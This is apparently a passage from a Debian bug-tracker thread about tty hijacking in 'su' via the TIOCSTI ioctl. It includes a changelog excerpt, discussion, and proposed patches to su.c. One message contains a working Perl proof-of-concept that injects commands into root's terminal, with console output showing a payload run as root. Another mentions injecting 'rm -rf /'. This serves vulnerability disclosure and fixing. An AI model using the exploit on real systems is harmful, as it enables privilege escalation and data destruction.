     - Fix handling of numerical dates in usermod -e. Closes: #[621810](bugreport.cgi?bug=621810)
     - usermod: When the shadow file exists but there are no shadow entries, an
       entry is created if the password is changed and passwd requires a shadow
       entry, or if aging features are used (-e or -f). Closes: [632461](bugreport.cgi?bug=632461)
     - Added diagnosis for lock failures. Closes: #[616167](bugreport.cgi?bug=616167)
     - grpck/pwck: NIS entries were dropped by -s (sort). Closes: #[622765](bugreport.cgi?bug=622765)
     - login does not log into utmp(x) and wtmp. This is already done by
       pam_lastlog. Closes: #[605329](bugreport.cgi?bug=605329)
     - groupmod: document that /etc/passwd can be modified by groupmod -g.
       Closes: #[647308](bugreport.cgi?bug=647308)
     - Updated patches
       + debian/patches/008_login_log_failure_in_FTMP
       + debian/patches/401_cppw_src.dpatch
       + debian/patches/402_cppw_selinux
       + debian/patches/428_grpck_add_prune_option
       + debian/patches/429_login_FAILLOG_ENAB
       + debian/patches/463_login_delay_obeys_to_PAM
       + debian/patches/501_commonio_group_shadow
       + debian/patches/505_useradd_recommend_adduser
       + debian/patches/506_relaxed_usernames
       + debian/patches/508_nologin_in_usr_sbin
       + debian/patches/523_su_arguments_are_concatenated
       + debian/patches/523_su_arguments_are_no_more_concatenated_by_default
       + debian/patches/542_useradd-O_option
       + debian/patches/900_testsuite_groupmems
     - debian/patches/008_su_get_PAM_username: Removed, feature supported
       upstream.
     - debian/patches/300_CVE-2011-0721: Removed, applied upstream.
     - Upstream translation updates from Debian BTS:
       + Brazilian Portuguese. Closes: #[622834](bugreport.cgi?bug=622834)
       + Catalan. Closes: #[627526](bugreport.cgi?bug=627526)
       + Danish. Closes: #[621330](bugreport.cgi?bug=621330), #[657514](bugreport.cgi?bug=657514)
       + German. Closes: #[622908](bugreport.cgi?bug=622908), #[656503](bugreport.cgi?bug=656503)
       + French. Closes: #[623608](bugreport.cgi?bug=623608), #[657621](bugreport.cgi?bug=657621)
       + Japanese. Closes: #[620978](bugreport.cgi?bug=620978)
       + Kazakh. Closes: #[620930](bugreport.cgi?bug=620930)
       + Portuguese. Closes: #[623722](bugreport.cgi?bug=623722), #[656686](bugreport.cgi?bug=656686)
       + Russian. Closes: #[622106](bugreport.cgi?bug=622106), #[655194](bugreport.cgi?bug=655194)
       + Spanish (Closes: #[630618](bugreport.cgi?bug=630618))
       + Swedish. Closes: #[621126](bugreport.cgi?bug=621126)
       + Simplified Chinese. Closes: #[655858](bugreport.cgi?bug=655858)
     - Upstream manpages translation updates from Debian BTS:
       + French. Closes: #[630250](bugreport.cgi?bug=630250), #[657622](bugreport.cgi?bug=657622)
       + German. Closes: #[628777](bugreport.cgi?bug=628777)
       + Simplified Chinese. Closes: #[602264](bugreport.cgi?bug=602264), #[655858](bugreport.cgi?bug=655858)
       + Danish added. Closes: #[657516](bugreport.cgi?bug=657516)
       + Russian. Closes: #[657710](bugreport.cgi?bug=657710)
   * debian/control: mark passwd as 'Multi-Arch: foreign'. Closes: #[614321](bugreport.cgi?bug=614321)
   * debian/securetty.linux: Add IBM pSeries console ports. Closes: #[597661](bugreport.cgi?bug=597661)
   * debian/securetty.linux: Add serial Console for MIPS Swarm.
     (<http://lists.debian.org/debian-release/2011/02/msg00320.html>)
   * debian/securetty.linux: Add s390/s390x ports ttysclp0. Closes: #[647469](bugreport.cgi?bug=647469)
   * debian/securetty.linux: Fixed typo: ttyama -> ttyAMA. Closes: #[544184](bugreport.cgi?bug=544184)
   * debian/rules, debian/man.insert, debian/man.insert.sed: Bug #507673 has
     been closed. It is no more needed to patch the generated manpages. This
     also fix failures to build twice is a row. Closes: #[636047](bugreport.cgi?bug=636047)
   * debian/patches/401_cppw_src.dpatch: Replace progname by Prog. Rename
     create_backup_file to create_copy. The lock functions do not set errno.
     Do not report the error string on cppwexit.
   * debian/patches/401_cppw_src.dpatch, debian/patches/402_cppw_selinux:
     Synchronize with coding style.
   * debian/patches/401_cppw_src.dpatch: Detect as well too many and too
     few arguments.
   * debian/patches/506_relaxed_usernames: Really check if the user/group
     name starts with a dash. Also forbid names starting with '+' or '~'.
     Document the naming policy in useradd.8 / groupadd.8.
   * debian/patches/506_relaxed_usernames: Also forbid names containing a
     comma.
   * debian/patches/901_testsuite_gcov: Do not revert the locale when testing
     with gcov to avoid coverage false negatives. This does not impact the
     debian binary package, only the test package.
   * debian/control: Add Build-Depends on libsemanage1-dev [linux-any]
   * debian/rules: Do not hard-code CFLAGS and LDFLAGS. Build with all
     hardening flags set. Closes: #[657010](bugreport.cgi?bug=657010)
   * debian/control: depends on dpkg-dev (>= 1.16.1~) for including
     /usr/share/dpkg/buildflags.mk
   * debian/control: Standards-Version: bumped to 3.9.2. No changes.
   * debian/login.defs: Set the default encryption method to SHA512.
     Closes: #[657717](bugreport.cgi?bug=657717)
 .
   [ Christian Perrier ]
   * Use "linux-any" instead of a negated list of architectures in
     Build-Depends. Closes: #[634465](bugreport.cgi?bug=634465)
Checksums-Sha1:
 20e1b380f87ab47b1dc4df181e0d5bccaa1351bf 1571 shadow_4.1.5-1.dsc
 57aa71b24378e3e549a5424ff7dc717d92ca266e 3426609 shadow_4.1.5.orig.tar.gz
 2f900ce1e275133fd440e4190aa41ff8cee4d086 80614 shadow_4.1.5-1.diff.gz
 06fe5fc7c55a199b178dd1122a393741dfb1f5ad 1269570 passwd_4.1.5-1_i386.deb
 1b0d5f4693d151ab94a9cbd56677440c2cd7d7b4 982270 login_4.1.5-1_i386.deb
Checksums-Sha256:
 a82f4432ec52aa6c163a4093db27f315dc36656863508fa5ac1598948ece7c3d 1571 shadow_4.1.5-1.dsc
 11decbb65bc35aacd27b27f2e8c56eec0047dab056ebbaf5d07e55c42fcf63d1 3426609 shadow_4.1.5.orig.tar.gz
 cd76ac895667fe8e8866b5adc3d5d84784950f53fd8926c348b72dda7ea6a3fc 80614 shadow_4.1.5-1.diff.gz
 cf489b966bb36c150aafe392bf179acac4652a5ae0a0cb5c6e5bdf4c31683950 1269570 passwd_4.1.5-1_i386.deb
 7aab48e006cc159c8b277879a5f2c3611bca78d00c01f9bf256d6a947e3a11a2 982270 login_4.1.5-1_i386.deb
Files:
 7797ed0ee9acb4a6c5819a671f653299 1571 admin required shadow_4.1.5-1.dsc
 18a0142a9c22d5c85297358398e99b0c 3426609 admin required shadow_4.1.5.orig.tar.gz
 a42217dda63d7c92f9717036b37a9578 80614 admin required shadow_4.1.5-1.diff.gz
 84e72e93ea8fe69b74bf8dc028c13284 1269570 admin required passwd_4.1.5-1_i386.deb
 982b60b21762a0ce12e9bf983740b937 982270 admin required login_4.1.5-1_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)

iEYEARECAAYFAk84OJsACgkQWgo5mup89a2V5ACeJNx7QyHEshAj/ycISL5FFw5y
0FoAn1r8naDGD7yfdU+TxVT70XeBwREA
=ncUx
-----END PGP SIGNATURE-----

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 25 Oct 2012 13:03:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=83), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=83), [link](#82)).

---

**Acknowledgement sent**
to `Ismaël RUAU <iruau@free.fr>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 25 Oct 2012 13:03:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=85), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=85), [link](#84)).

---

[Message #86](#86) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=86), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=86), reply):

![](/cgi-bin/libravatar.cgi?email=iruau%40free.fr)
From: Ismaël RUAU <iruau@free.fr>
To: 628843@bugs.debian.org
Subject: Re: Bug#628843: login: tty hijacking possible in "su" via TIOCSTI
ioctl
Date: Thu, 25 Oct 2012 15:00:09 +0200
```
Hello,

I'm bumping this bug to point out that the problem is not 100% fixed.
Even though "su -c" is now safe, interactive "su" or "su -" are still at
risk and this should probably be reflected here on the BTS.

Unfortunately I don't see any way to fix this without removing the
controlling terminal of su'ed interactive shells like "su -c" does, but
this would totally cripple su and render su'ed interactive shells
unusable ("su" would then become equivalent to "su -c $SHELL" and we'd
hit bug #659878 which is a PITA).

I'll leave it to you maintainers whether to actually reopen this bug or not.

Scenario:
root uses su to get an interactive shell into a compromised user
account, which uses the aforementioned exploit, just slightly modified
to send an exit before the actual payload.

On the compromised account side:
---- CONSOLE OUTPUT ----
test-user$ cat ~/exploit.pl
#!/usr/bin/perl
require "sys/ioctl.ph";
open my $tty_fh, '<', '/dev/tty' or die $!;
foreach my $c (split //, "exit\n".'echo Payload as $(whoami)'.$/) {
    ioctl($tty_fh, &TIOCSTI, $c);
}

test-user$ cat ~/.bashrc
<snip>
perl $HOME/exploit.pl
---- END CONSOLE OUTPUT ----

Now root actually uses su. Note that the only user keystrokes are the
initial "su test-user", the rest is entirely automatic and part of the
exploit (I included the user/root shell prompts as displayed on my
terminal).

---- CONSOLE OUTPUT ----
root# su test-user
exit
echo Payload as $(whoami)
test-user$ exit
root# echo Payload as $(whoami)
Payload as root
---- END CONSOLE OUTPUT ----

--
Ismaël RUAU

```

---

**Bug reopened**
Request was from `"Fabien C." <v72vogpjiqt4b5j@jetable.org>`
to `control@bugs.debian.org`.
(Sun, 03 Mar 2013 19:54:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=88), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=88), [link](#87)).

---

**No longer marked as fixed in versions shadow/1:4.1.5-1.**
Request was from `"Fabien C." <v72vogpjiqt4b5j@jetable.org>`
to `control@bugs.debian.org`.
(Sun, 03 Mar 2013 19:54:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=90), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=90), [link](#89)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 03 Mar 2013 20:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=92), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=92), [link](#91)).

---

**Acknowledgement sent**
to `"Fabien C." <v72vogpjiqt4b5j@jetable.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 03 Mar 2013 20:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=94), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=94), [link](#93)).

---

[Message #95](#95) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=95), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=95), reply):

![](/cgi-bin/libravatar.cgi?email=v72vogpjiqt4b5j%40jetable.org)
From: "Fabien C." <v72vogpjiqt4b5j@jetable.org>
To: Ismaël RUAU <iruau@free.fr>
Cc: 628843@bugs.debian.org
Subject: Re: Bug#628843: login: tty hijacking possible in "su" via TIOCSTI
ioctl
Date: Sun, 03 Mar 2013 21:10:20 +0100
```
Hello,

I think Ismaël has a point here:

> I'm bumping this bug to point out that the problem is not 100% fixed.
> Even though "su -c" is now safe, interactive "su" or "su -" are still at
> risk and this should probably be reflected here on the BTS.

I successfully used this on my up-to-date Squeeze system.

However, one can use the following workaround to avoid giving root access:
 # exec su baduser

However this is still problematic:
 niceguy$ su
    root$ exec su badguy
  badguy$ ./exploit.pl

 => the command is still launched by niceguy.

Not sure if a "good" solution exists...

Fabien C.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Mon, 04 Mar 2013 19:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=97), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=97), [link](#96)).

---

**Acknowledgement sent**
to `Ismaël RUAU <iruau@free.fr>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 04 Mar 2013 19:15:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=99), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=99), [link](#98)).

---

[Message #100](#100) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=100), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=100), reply):

![](/cgi-bin/libravatar.cgi?email=iruau%40free.fr)
From: Ismaël RUAU <iruau@free.fr>
To: 628843@bugs.debian.org
Subject: Re: Bug#628843: login: tty hijacking possible in "su" via TIOCSTI,
ioctl
Date: Mon, 04 Mar 2013 20:13:28 +0100
```
found 1:4.1.5.1-1

This problem still exists in Wheezy.

--
Ismaël RUAU

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Wed, 06 Mar 2013 17:27:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=102), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=102), [link](#101)).

---

**Acknowledgement sent**
to `Serge Hallyn <serge.hallyn@ubuntu.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Wed, 06 Mar 2013 17:27:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=104), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=104), [link](#103)).

---

[Message #105](#105) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=105), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=105), reply):

![](/cgi-bin/libravatar.cgi?email=serge.hallyn%40ubuntu.com)
From: Serge Hallyn <serge.hallyn@ubuntu.com>
To: 628843@bugs.debian.org
Subject: use pty?
Date: Wed, 6 Mar 2013 11:23:01 -0600
```
Hi,

the last few comments in this bug have suggested there may not be a good
solution for this problem.

As mdeslaur has pointed out in irc, one solution would be to have
interactive su use a new pty for the session.  Not trivial, but
if the idea itself isn't objectionable I wouldn't mind trying a
patch when I find time.

Alternatively, we could simply update the su man page to recommend
su only be used for increasing privilege (becoming root), and recommend
other means for dropping privilege or switching users.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Thu, 07 Mar 2013 09:12:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=107), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=107), [link](#106)).

---

**Acknowledgement sent**
to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 07 Mar 2013 09:12:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=109), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=109), [link](#108)).

---

[Message #110](#110) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=110), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=110), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: Serge Hallyn <serge.hallyn@ubuntu.com>, 628843@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#628843: use pty?
Date: Thu, 7 Mar 2013 11:10:14 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=110) (text/plain, inline)]
```
```
Hello,

On Wed, Mar 06, 2013 at 11:23:01AM -0600, Serge
Hallyn wrote:
> As mdeslaur has pointed out in irc, one solution
> would be to have interactive su use a new pty
> for the session.  Not trivial,

and not very portable too. The best pty handling
is done by Expect (Tcl/Expect) IMHO, but its code
looks too complex.

Probably, we should do the simplified pty for
selected platforms (GNU/Linux, FreeBSD) and try
not to break others (and leave them vulnerable
until someone cares much).

> Alternatively, we could simply update the su man
> page to recommend su only be used for increasing
> privilege (becoming root), and recommend other
> means for dropping privilege or switching users.

IMHO we should do both -- first update the su man
page (and leave it so for other platforms), then
implement pty workaround for Linux and BSD and
restore su manpage for Linux/BSD.

--
With best regards,
xrgtn

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=110) (application/pgp-signature, inline)]
```

---

**Marked as found in versions shadow/1:4.1.4.2+svn3283-1.**
Request was from `Michael Gilbert <mgilbert@debian.org>`
to `control@bugs.debian.org`.
(Sat, 16 Mar 2013 20:15:18 GMT) ([full text](bugreport.cgi?bug=628843;msg=112), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=112), [link](#111)).

---

**No longer marked as found in versions shadow/1:4.1.4.2+svn3283-2+squeeze1.**
Request was from `Michael Gilbert <mgilbert@debian.org>`
to `control@bugs.debian.org`.
(Sat, 16 Mar 2013 20:15:19 GMT) ([full text](bugreport.cgi?bug=628843;msg=114), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=114), [link](#113)).

---

**Severity set to 'important' from 'critical'**
Request was from `Julien Cristau <jcristau@debian.org>`
to `control@bugs.debian.org`.
(Wed, 20 Mar 2013 16:54:07 GMT) ([full text](bugreport.cgi?bug=628843;msg=116), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=116), [link](#115)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Fri, 29 Mar 2013 23:12:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=118), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=118), [link](#117)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Fri, 29 Mar 2013 23:12:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=120), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=120), [link](#119)).

---

[Message #121](#121) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=121), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=121), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: 628843@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Bug#628843: login: tty hijacking - suggested solution inclusive patch
Date: Fri, 29 Mar 2013 23:54:21 +0100
```
Hello,

IMHO it is not the right approach in just simply dropping the
controlling terminal independent in using the parameter -c or not
because You cannot have an interactive shell without a
controlling terminal.

Sure, if you call anything else but a shell then it is IMHO up to
the application to drop the controlling terminal.

I think that in any case the right solution is in just flushing
the input queue before returning to the caller which would not
just protect in case of hijacking but also of buggy applications.

The following patch was just a quick fix of the actual version
in Wheezy 4.1.5.1 which worked for me and was tested by myself
with USE_PAM but also without PAM but in the later case just
from user 'root' to another user in using the above mentioned
exploit.

Maybe further tests are needed also in respect of the modified
signals.

The following patch as suggested solution:

___BEGIN_PATCH___
--- shadow-4.1.5.1.orig/src/su.c	2012-05-25 13:51:55.000000000 +0200
+++ shadow-4.1.5.1/src/su.c	2013-03-29 21:52:11.930790904 +0100
@@ -62,8 +62,8 @@
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
-#ifndef USE_PAM
 #include <sys/ioctl.h>
+#ifndef USE_PAM
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <fcntl.h>
@@ -106,10 +106,10 @@ static bool change_environment = true;

 #ifdef USE_PAM
 static pam_handle_t *pamh = NULL;
+#endif
 static int caught = 0;
 /* PID of the child, in case it needs to be killed */
 static pid_t pid_child = 0;
-#endif

 /*
  * External identifiers
@@ -123,10 +123,9 @@ extern size_t newenvc; /* libmisc/env.c
 static void execve_shell (const char *shellname,
                           char *args[],
                           char *const envp[]);
-#ifdef USE_PAM
 static RETSIGTYPE kill_child (int unused(s));
-static void prepare_pam_close_session (void);
-#else				/* !USE_PAM */
+static void prepare_close_session (void);
+#ifndef USE_PAM
 static RETSIGTYPE die (int);
 static bool iswheel (const char *);
 #endif				/* !USE_PAM */
@@ -177,7 +176,8 @@ static bool iswheel (const char *usernam
 	}
 	return is_on_list (grp->gr_mem, username);
 }
-#else				/* USE_PAM */
+#endif				/* USE_PAM */
+
 static RETSIGTYPE kill_child (int unused(s))
 {
 	if (0 != pid_child) {
@@ -189,7 +189,6 @@ static RETSIGTYPE kill_child (int unused
 	}
 	exit (255);
 }
-#endif				/* USE_PAM */

 /* borrowed from GNU sh-utils' "su.c" */
 static bool restricted_shell (const char *shellname)
@@ -260,7 +259,6 @@ static void execve_shell (const char *sh
 	}
 }

-#ifdef USE_PAM
 /* Signal handler for parent process later */
 static void catch_signals (int sig)
 {
@@ -268,12 +266,12 @@ static void catch_signals (int sig)
 }

 /*
- * prepare_pam_close_session - Fork and wait for the child to close the session
+ * prepare_close_session - Fork and wait for the child to close the session
  *
  *	Only the child returns. The parent will wait for the child to
  *	terminate and exit.
  */
-static void prepare_pam_close_session (void)
+static void prepare_close_session (void)
 {
 	sigset_t ourset;
 	int status;
@@ -311,17 +309,6 @@ static void prepare_pam_close_session (v
 		if (   (sigaddset (&ourset, SIGTERM) != 0)
 		    || (sigaddset (&ourset, SIGALRM) != 0)
 		    || (sigaction (SIGTERM, &action, NULL) != 0)
-		    || (   !doshell /* handle SIGINT (Ctrl-C), SIGQUIT
-		                     * (Ctrl-\), and SIGTSTP (Ctrl-Z)
-		                     * since the child will not control
-		                     * the tty.
-		                     */
-		        && (   (sigaddset (&ourset, SIGINT)  != 0)
-		            || (sigaddset (&ourset, SIGQUIT) != 0)
-		            || (sigaddset (&ourset, SIGTSTP) != 0)
-		            || (sigaction (SIGINT,  &action, NULL) != 0)
-		            || (sigaction (SIGQUIT, &action, NULL) != 0)
-		            || (sigaction (SIGTSTP,  &action, NULL) != 0)))
 		    || (sigprocmask (SIG_UNBLOCK, &ourset, NULL) != 0)
 		    ) {
 			fprintf (stderr,
@@ -366,6 +353,12 @@ static void prepare_pam_close_session (v
 		} while (!stop);
 	}

+	/* This avoids the callee to inject commands on
+	 * the caller's tty including srappy incidents. */
+	ret = ioctl( STDIN_FILENO, TCFLSH, TCIFLUSH);
+	if( ret == -1)
+		fprintf (stderr, _("%s: Flushing input: %s\n"), Prog, strerror( errno));
+
 	if (0 != caught) {
 		(void) fputs ("\n", stderr);
 		(void) fputs (_("Session terminated, terminating shell..."),
@@ -373,6 +366,7 @@ static void prepare_pam_close_session (v
 		(void) kill (pid_child, caught);
 	}

+#ifdef USE_PAM
 	ret = pam_close_session (pamh, 0);
 	if (PAM_SUCCESS != ret) {
 		SYSLOG ((LOG_ERR, "pam_close_session: %s",
@@ -382,6 +376,7 @@ static void prepare_pam_close_session (v

 	(void) pam_setcred (pamh, PAM_DELETE_CRED);
 	(void) pam_end (pamh, PAM_SUCCESS);
+#endif				/* USE_PAM */

 	if (0 != caught) {
 		(void) signal (SIGALRM, kill_child);
@@ -395,7 +390,6 @@ static void prepare_pam_close_session (v
 	                                : WTERMSIG (status) + 128);
 	/* Only the child returns. See above. */
 }
-#endif				/* USE_PAM */

 /*
  * usage - print command line syntax and exit
@@ -1057,13 +1051,16 @@ int main (int argc, char **argv)
 		exit (1);
 	}

-	prepare_pam_close_session ();
+	prepare_close_session ();

 	/* become the new user */
 	if (change_uid (pw) != 0) {
 		exit (1);
 	}
 #else				/* !USE_PAM */
+
+	prepare_close_session ();
+
 	/* no limits if su from root (unless su must fake login's behavior) */
 	if (!caller_is_root || fakelogin) {
 		setup_limits (pw);
@@ -1076,36 +1073,6 @@ int main (int argc, char **argv)

 	set_environment (pw);

-	if (!doshell) {
-		/* There is no need for a controlling terminal.
-		 * This avoids the callee to inject commands on
-		 * the caller's tty. */
-		int err = -1;
-
-#ifdef USE_PAM
-		/* When PAM is used, we are on the child */
-		err = setsid ();
-#else
-		/* Otherwise, we cannot use setsid */
-		int fd = open ("/dev/tty", O_RDWR);
-
-		if (fd >= 0) {
-			err = ioctl (fd, TIOCNOTTY, (char *) 0);
-			(void) close (fd);
-		} else if (ENXIO == errno) {
-			/* There are no controlling terminal already */
-			err = 0;
-		}
-#endif				/* USE_PAM */
-
-		if (-1 == err) {
-			(void) fprintf (stderr,
-			                _("%s: Cannot drop the controlling terminal\n"),
-			                Prog);
-			exit (1);
-		}
-	}
-
 	/*
 	 * PAM_DATA_SILENT is not supported by some modules, and
 	 * there is no strong need to clean up the process space's
___END_PATCH___

with best regards

Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sat, 30 Mar 2013 12:27:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=123), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=123), [link](#122)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sat, 30 Mar 2013 12:27:09 GMT) ([full text](bugreport.cgi?bug=628843;msg=125), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=125), [link](#124)).

---

[Message #126](#126) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=126), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=126), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: 628843@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Bug#628843: login: tty hijacking - suggested solution inclusive patch
+ fix
Date: Sat, 30 Mar 2013 13:24:14 +0100
```
Hello,

I'm adding a small fix to the suggested patch before just to avoid
messages on stderr if case of not having a controlling tty:

___BEGIN_PATCH___
--- shadow-4.1.5.1.orig/src/su.c	2013-03-29 21:52:11.930790904 +0100
+++ shadow-4.1.5.1/src/su.c	2013-03-30 13:03:49.813030646 +0100
@@ -356,7 +356,7 @@ static void prepare_close_session (void)
 	/* This avoids the callee to inject commands on
 	 * the caller's tty including srappy incidents. */
 	ret = ioctl( STDIN_FILENO, TCFLSH, TCIFLUSH);
-	if( ret == -1)
+	if( ret == -1 && errno != ENOTTY)
 		fprintf (stderr, _("%s: Flushing input: %s\n"), Prog, strerror( errno));

 	if (0 != caught) {
___END_PATCH___

with best regards

Wolf

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 31 Mar 2013 12:51:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=128), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=128), [link](#127)).

---

**Acknowledgement sent**
to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 31 Mar 2013 12:51:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=130), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=130), [link](#129)).

---

[Message #131](#131) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=131), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=131), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: Wolfgang Zarre <lkdev@essax.com>, 628843@bugs.debian.org
Cc: nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#628843: login: tty hijacking -
suggested solution inclusive patch
Date: Sun, 31 Mar 2013 15:49:12 +0300
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=131) (text/plain, inline)]
```
```
Hello,

On Fri, Mar 29, 2013 at 11:54:21PM +0100, Wolfgang
Zarre wrote:
> I think that in any case the right solution is
> in just flushing the input queue before
> returning to the caller which would not just
> protect in case of hijacking but also of buggy
> applications.

I've successfuly tested an implementation which
keeps the exploit running in the background
_after_ returning control back to rot user. The
running exploit then periodicaly inserts commands
into root terminal, like whoami, rm -rf / etc :)

So flushing the input queue isn't a complete
solution.

--
With best regards,
xrgtn

```
```
[[signature.asc](bugreport.cgi?att=1;bug=628843;filename=signature.asc;msg=131) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `login`.
(Sun, 31 Mar 2013 17:39:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=133), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=133), [link](#132)).

---

**Acknowledgement sent**
to `Wolfgang Zarre <lkdev@essax.com>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 31 Mar 2013 17:39:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=135), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=135), [link](#134)).

---

[Message #136](#136) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=136), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=136), reply):

![](/cgi-bin/libravatar.cgi?email=lkdev%40essax.com)
From: Wolfgang Zarre <lkdev@essax.com>
To: Alexander Gattin <xrgtn@yandex.ru>
Cc: 628843@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: [Pkg-shadow-devel] Bug#628843: login: tty hijacking - suggested
